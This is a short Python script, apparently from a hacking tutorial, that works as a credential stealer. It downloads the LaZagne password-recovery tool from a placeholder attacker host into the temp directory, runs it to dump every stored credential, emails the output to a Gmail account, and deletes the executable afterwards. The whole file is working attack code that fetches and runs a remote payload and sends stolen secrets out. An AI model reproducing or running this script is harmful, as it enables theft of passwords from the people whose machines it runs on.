#!/usr/bin/env python

import subprocess, smtplib, os, requests, tempfile


def download(url):
    get_response = requests.get(url)
    file_type = url.split("/")[-1]
    with open(file_type, "wb") as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


# Cross platform way
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://IP/evil-files/lazagne.exe")
result = subprocess.check_output("lazagne.exe all", shell=True)
send_mail('...@gmail.com', 'password', result)
os.remove("lazagne.exe")